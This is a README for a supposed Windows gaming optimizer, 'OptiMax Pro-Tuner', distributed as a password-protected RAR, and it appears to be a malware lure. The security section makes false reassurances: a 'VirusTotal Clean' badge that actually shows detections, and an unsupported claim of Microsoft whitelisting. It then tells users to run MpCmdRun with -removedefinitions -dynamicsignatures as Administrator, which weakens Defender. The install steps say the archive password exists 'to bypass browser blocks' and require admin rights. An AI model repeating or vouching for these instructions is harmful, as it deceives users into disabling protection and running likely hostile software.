# 🚀 OptiMax Pro-Tuner v3.4 Final Release

[![VirusTotal Clean](https://img.shields.io/badge/VirusTotal-64%2F70%20Clean-brightgreen?style=for-the-badge&logo=virustotal)](https://www.virustotal.com/gui/file/27c27c0910825747e1717cdd304dd9f9c39f1ea92346975778556d89e5ca12bd/detection)
[![Microsoft Defender](https://img.shields.io/badge/Microsoft%20Defender-Verified%20Clean-brightgreen?style=for-the-badge&logo=windows)](https://www.microsoft.com/en-us/wdsi/submissions)

**OptiMax Pro-Tuner** is an aggressive, kernel-level system orchestrator designed to eliminate DPC latency and stabilize frame pacing in competitive gaming. It hooks directly into the **NT Kernel** to enforce hardware-level locks typically reserved for system-critical processes.

### 🟢 Security Status: Officially Whitelisted
OptiMax v3.4 has been manually reviewed by Microsoft Security Analysts and officially cleared of all false positives. If your local Windows Defender still flags the file, it is using an outdated, cached definitions list. 

**To force-update your local Defender cache:**
1. Open Command Prompt as Administrator.
2. Run: `cd c:\Program Files\Windows Defender`
3. Run: `MpCmdRun.exe -removedefinitions -dynamicsignatures`
4. Run: `MpCmdRun.exe -SignatureUpdate`

### 🛠️ Installation and Usage
1. **Download** | Grab the latest `OptiMax_v3.4.rar` from the [Releases Tab](https://github.com/BigBE4TS/OptiMax-Pro-Tuner/releases)
2. **Password** | Use password **123** or **optimax** to extract (required to bypass browser blocks)
3. **Run as Admin** | Requires administrative privileges to command the NT Kernel
4. **Target Library** | Add your game executable to the list
5. **Minimize** | Keep the app in the System Tray to maintain Live Locks

### 💎 Key Features
* **0.5ms Timer Resolution** | Forces a global system clock lock to 0.5ms to reduce input lag
* **Advanced Power Orchestrator** | Disables Core Parking and forces an Ultimate Performance state
* **True Standby Purge** | Deep-cleans the Windows Standby List to free physical RAM
* **CPU Thread Director** | Dynamically locks game processes to Performance Cores (P-Cores)
* **GPU MSI Mode Injector** | Forces Message Signaled Interrupts on your GPU to bypass legacy IRQ sharing
* **Network Orchestrator** | Disables Nagle's Algorithm for zero-delay packet transmission

### 🤖 Dynamic AutoBoost
The app autonomously monitors your system. It engages performance hooks when a target game is detected and reverts to defaults when the game closes to save power.

### 📜 Development Log v3.4.0
* Fixed 180 Winsock redefinition errors in the build pipeline
* Fixed Update Modal UI alignment and clipping
* Added Strict Semantic Versioning (SemVer) for the updater
* Added 3-second high-speed Splash Screen with typewriter sync

### 🤝 Support and Community
* **Discord** | [Join our Server](https://discord.gg/QchuXbVWP3)
* **Developer** | BigBE4TS

> **Disclaimer** | OptiMax is provided as is. Modifying system registries and kernel behavior carries risks. The developers are not responsible for system instability or hardware wear caused by extreme tuning.
